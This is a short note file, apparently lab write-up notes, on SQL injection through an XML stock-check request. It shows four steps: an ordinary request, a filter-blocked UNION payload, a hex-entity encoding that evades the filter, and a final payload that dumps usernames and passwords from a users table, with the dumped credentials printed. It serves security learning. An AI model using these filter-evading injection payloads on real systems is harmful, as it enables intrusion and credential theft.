/*

1) POST /product/stock HTTP/1.1
//this request contains the XML data being sent

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>7</productId>
    <storeId>1</storeId>
</stockCheck>

2) 
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>7 UNION SELECT * FROM users;</productId>
    <storeId>1</storeId>
</stockCheck>

//Attack detected means WAF 

3) hex encode using hackvertor

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>7</productId>
    <storeId>
        <@hex_entities>1 UNION SELECT 'abc'
        <@/hex_entities>
    </storeId>
</stockCheck>
//prints abc in response

4) 
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>7</productId>
    <storeId>
        <@hex_entities>1 UNION SELECT username||'~'||password FROM users
        <@/hex_entities>
    </storeId>
</stockCheck>


carlos~l82eezhcl1k0rnoqujwk
wiener~ko3jraoazzn8t7schkgk
administrator~nyb0xhw6pmay1x2vo2w7


*/